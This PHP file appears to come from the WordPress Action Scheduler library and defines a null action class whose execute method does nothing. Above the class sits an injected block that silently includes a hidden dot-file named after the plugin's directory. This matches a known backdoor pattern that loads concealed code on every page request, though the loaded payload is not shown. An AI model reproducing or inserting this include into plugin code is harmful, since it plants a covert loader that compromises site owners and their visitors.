<?php

/**
 * Class ActionScheduler_NullAction
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ActionScheduler_NullAction extends ActionScheduler_Action {

	public function __construct( $hook = '', array $args = array(), ActionScheduler_Schedule $schedule = NULL ) {
		$this->set_schedule( new ActionScheduler_NullSchedule() );
	}

	public function execute() {
		// don't execute
	}
}
 